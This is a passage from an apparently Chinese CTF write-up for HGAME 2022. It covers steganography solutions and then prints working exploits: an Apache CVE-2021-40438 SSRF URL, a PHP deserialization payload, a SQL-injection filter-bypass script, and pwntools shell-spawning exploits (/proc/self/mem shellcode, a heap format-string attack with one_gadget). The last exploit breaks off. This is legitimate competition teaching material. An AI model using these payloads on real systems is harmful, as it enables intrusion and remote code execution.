		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_firsthalf.png"
			width="773"
			height="395"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_firsthalf_hu23c2c5c8741367aaf5e2a7a8e9ade851_46207_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_firsthalf_hu23c2c5c8741367aaf5e2a7a8e9ade851_46207_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>利用 Data Extract 工具检查 LSB 隐写情况，最终发现当设置 <code>Bit Planes：Red0，Green0，Blue0，Extracted By：Column，Bit Order：LSB First</code> 时得到 flag 后半段。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 129; 
			flex-basis: 310px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_secondhalf.png" data-size="1083x837">
		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_secondhalf.png"
			width="1083"
			height="837"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_secondhalf_hu8438922e8bae4c53cd62bc725d28e15a_68855_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_secondhalf_hu8438922e8bae4c53cd62bc725d28e15a_68855_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="misc群青其实是幽灵东京">[Misc]群青(其实是幽灵东京)</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>​下载题目给出的 wav 文件，放入 Audacity，查看频谱图发现信息：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 474; 
			flex-basis: 1139px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/QunQing_Yoasobi.png" data-size="992x209">
		<img src="/post/hgame2022-writeup-by-or4nge/img/QunQing_Yoasobi.png"
			width="992"
			height="209"
			srcset="/post/hgame2022-writeup-by-or4nge/img/QunQing_Yoasobi_hu469f14e44cc6b8da185d331c1408badb_514032_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/QunQing_Yoasobi_hu469f14e44cc6b8da185d331c1408badb_514032_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>​查看文件属性，在“详细信息”一栏中发现提示：why not try try SilentEye。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 309; 
			flex-basis: 742px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/QunQing_tipwav.png" data-size="535x173">
		<img src="/post/hgame2022-writeup-by-or4nge/img/QunQing_tipwav.png"
			width="535"
			height="173"
			srcset="/post/hgame2022-writeup-by-or4nge/img/QunQing_tipwav_hu2566a2b7166ca649ad77c10a88b3cdcd_4633_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/QunQing_tipwav_hu2566a2b7166ca649ad77c10a88b3cdcd_4633_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>​这些信息提示可能存在 SilentEye 隐写。使用 SilentEye 中的 Encrypted 方式解密，设置密钥为 Yoasobi，得到一个新的 wav 文件。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 125; 
			flex-basis: 300px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/QunQing_silenteye.png" data-size="654x522">
		<img src="/post/hgame2022-writeup-by-or4nge/img/QunQing_silenteye.png"
			width="654"
			height="522"
			srcset="/post/hgame2022-writeup-by-or4nge/img/QunQing_silenteye_hu749eb616a4717df22e0e4902ea7b3d92_68588_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/QunQing_silenteye_hu749eb616a4717df22e0e4902ea7b3d92_68588_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>​文件名 S_S_T_V.wav 提示为 SSTV 隐写，使用 robot36 分析得到一张含有二维码的图片，扫描即可得到 flag。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 133; 
			flex-basis: 320px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/QunQing_QR.jpg" data-size="320x240">
		<img src="/post/hgame2022-writeup-by-or4nge/img/QunQing_QR.jpg"
			width="320"
			height="240"
			srcset="/post/hgame2022-writeup-by-or4nge/img/QunQing_QR_hu2ca258c85f495c4bfb58e30fb973a4d3_25957_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeup-by-or4nge/img/QunQing_QR_hu2ca258c85f495c4bfb58e30fb973a4d3_25957_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="iot饭卡的-uno">[IOT]饭卡的 uno</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>用 hex2bin 转换，然后 strings 拿到 flag。</p>
<blockquote>
<p>s0uthwood: 补充一下 <code>.hex</code> 文件格式</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">冒号</th>
<th style="text-align:center">本行数据长度</th>
<th style="text-align:center">本行数据在文件中的起始地址</th>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">数据</th>
<th style="text-align:center">校验码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>:</code></td>
<td style="text-align:center">1 byte</td>
<td style="text-align:center">2 byte</td>
<td style="text-align:center">1 byte</td>
<td style="text-align:center">N byte</td>
<td style="text-align:center">1 byte</td>
</tr>
</tbody>
</table>
<h2 id="week2">week2</h2>
<h3 id="webwebpack-engine">[Web]webpack-engine</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>webpack,看f12前端的源码即可。</p>
<h3 id="webapache">[Web]Apache!</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>CVE-2021-40438</p>
<pre tabindex="0"><code>http://httpd.summ3r.top:60010/proxy/?unix:[A*5000]|http://internal.host/flag
</code></pre><h3 id="web一本单词书">[Web]一本单词书</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>下载下来源码，登录用弱类型绕，后面这个老哥自己手动实现了一个对映射的序列化再反序列化，自己写的肯定有bug</p>
<p>最终的payload：<code>{&quot;sb|O:4:\&quot;Evil\&quot;:2:{s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;}aaa&quot;:&quot;2b&quot;}</code></p>
<h3 id="webpokemon">[Web]Pokemon</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>sql注入，注入点在报错界面，通过报错能查看出查询语句，同时也能测出waf掉了哪些关键字，可以通过双写绕过，为了方便，就写脚本帮我replace了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://121.43.141.153:60056/error.php?code=&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bypass</span>(s):
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39; like &#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;/*/**/*/&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;seleselectct&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;union&#39;</span>, <span style="color:#e6db74">&#39;ununionion&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;or&#39;</span>, <span style="color:#e6db74">&#39;oorr&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;and&#39;</span>, <span style="color:#e6db74">&#39;anandd&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;from&#39;</span>, <span style="color:#e6db74">&#39;frofromm&#39;</span>)
    s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;where&#39;</span>, <span style="color:#e6db74">&#39;whwhereere&#39;</span>)
    <span style="color:#66d9ef">return</span> s

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404 union select 1, database()#&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404 union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()#&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404 union select 1, group_concat(column_name) from information_schema.columns where table_name=&#39;fllllllllaaaaaag&#39;#&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404 union select 1, flag from fllllllllaaaaaag#&#34;</span>
payload <span style="color:#f92672">=</span> bypass(payload)
print(payload)
r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> payload)
print(r<span style="color:#f92672">.</span>text)
</code></pre></div><h3 id="webat0m的留言板">[Web]At0m的留言板</h3>
<h3 id="pwnblind">[Pwn]blind</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p>访问 <code>proc/self/mem</code> 即可修改当前进程的内存， <code>.text</code> 段也是可修改的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">51808</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;write: &#34;</span>)

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], base <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/proc/self/mem</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]))
payload <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">0x300</span>, asm(<span style="color:#e6db74">&#39;nop&#39;</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, payload)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="pwnecho-sever">[Pwn]echo sever</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p>堆上的格式化字符串， 打 <code>realloc</code>， <code>og</code> 填到 <code>malloc_hook</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./echo&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">52259</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(length, content):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;your content&#39;s length:&#34;</span>, str(length))
    p<span style="color:#f92672">.</span>send(content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)


echo(<span style="color:#ae81ff">0x450</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%3$pzz&#34;</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;zz&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">895550</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>]
echo(<span style="color:#ae81ff">0x450</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%6$pzz&#34;</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>)
heap_0 <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;zz&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>

echo(<span style="color:#ae81ff">0x450</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$pzz&#34;</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>)
heap_fastbins <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;zz&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>)

print(hex(libc<span style="color:#f92672">.</span>address))
print(hex(heap_0))
print(hex(heap_0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>))
print(hex(heap_fastbins))
echo(<span style="color:#ae81ff">0x450</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x3e0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x370</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x300</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x290</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x220</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x1b0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x140</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0xd0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)


echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str(heap_0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#f92672">.</span>encode()  <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c%6$hhn&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((heap_fastbins <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe0</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>)<span style="color:#f92672">.</span>encode()  <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c%10$hn&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]))
echo(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)


echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x51</span>))
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%96c</span><span style="color:#e6db74">%10$hhn&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x41</span>))
echo(<span style="color:#ae81ff">0x30</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__realloc_hook&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">27</span>))
echo(<span style="color:#ae81ff">0x30</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span>)
<span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x129F)&#34;)</span>
echo(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%10$ln&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe6c81</span>))
<span style="color:#75715e"># echo(0x0, b&#34;&#34;)</span>
echo(<span style="color:#ae81ff">0x0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
<span style="color:#75715e"># %224c%4$hhn</span>

p<span style="color:#f92672">.</span>interactive()

<span style="color:#75715e"># 0xe6c7e execve(&#34;/bin/sh&#34;, r15, r12)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [r15] == NULL || r15 == NULL</span>
<span style="color:#75715e">#   [r12] == NULL || r12 == NULL</span>

<span style="color:#75715e"># 0xe6c81 execve(&#34;/bin/sh&#34;, r15, rdx)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [r15] == NULL || r15 == NULL</span>
<span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>

<span style="color:#75715e"># 0xe6c84 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsi] == NULL || rsi == NULL</span>
<span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>
</code></pre></div><h3 id="pwnoldfashion_note">[Pwn]oldfashion_note</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p>uaf 2.31 打 <code>fastbins</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./note&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">51445</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;farewell&#34;</span>, str(i))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, content):
    menu(<span style="color:#ae81ff">1</span>)
